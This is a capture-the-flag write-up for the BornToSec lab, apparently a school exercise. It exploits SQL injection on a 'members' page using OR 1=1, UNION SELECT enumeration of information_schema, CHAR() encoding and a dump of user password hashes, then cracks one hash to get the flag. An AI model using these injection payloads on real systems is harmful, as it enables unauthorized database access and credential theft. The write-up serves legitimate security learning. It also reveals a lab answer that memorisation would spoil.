# SQL Injection on Members page

## Description 
SQL Injection (SQLi) is a web security vulnerability where attackers manipulate SQL queries executed by an application to gain unauthorized access to a database. This can lead to data theft, modification, or even full control of the database server.

## BornToSec
Here on the search member page you have an input which is asking for an ID. If you input an id and submit, you will see in the URL that the id is passed as a parameter. This is a good sign that the application is vulnerable to SQL Injection.

To get all the users we need to give a conditions to the query that will always be true. We can do this by using the OR 1=1 statement. This will return all the users in the database.

```
http://10.11.249.222/index.php?page=member&Submit=Submit&id=5 OR 1=1
```

With this, you will get the list of every users in the table.

Then what we want is to get more informations about the user table and the columns but to do this we first need to discover the name of the table (even if in this case we already know it's users).

```
http://10.11.249.222/index.php?page=member&Submit=Submit&id=5 UNION SELECT NULL, table_name FROM information_schema.tables
```

With this query, we are able to get the name of every tables in the database. We can see that the table users is present.

We would now wanted to get the columns of the users table by using the following query.

```
http://10.11.249.222/index.php?page=member&Submit=Submit&id=5 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'
```

As you see, we are not able to send string in the query so we need to use the CHAR function to send the table name.

u → 117
s → 115
e → 101
r → 114
s → 115

CHAR(117, 115, 101, 114, 115)

Now we can get the columns of the users table.

```
http://10.11.249.222/index.php?page=member&Submit=Submit&id=5 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117, 115, 101, 114, 115)
```

Once we have the columns, we can get the data of the users table. We can see columns like user_id, first_name, last_name, town, country, planet, Commentaire, countersign.

And 2 of them are interesting, Commentaire and countersign. We can get the data of these columns by using the following query.

```
http://10.11.249.222/index.php?page=member&Submit=Submit&id=5 UNION SELECT user_id, commentaire FROM users
```

With this query, we are able to get the Commentaire of the user with the id 5. We can see taht the Commentaire of the user with id=5 is "Decrypt this password -> then lower all the char. Sh256 on it and it's good !".

We now need to get the countersign of the user with the id 5. We can do this by using the following query.
```
http://10.11.249.222/index.php?page=member&Submit=Submit&id=5 UNION SELECT user_id, countersign FROM users
```

Now we can use a md5 decrypter to get the password of the user with the id 5. The password is FortyTwo.
Then we use sha256 on fortytwo and we get the flag.


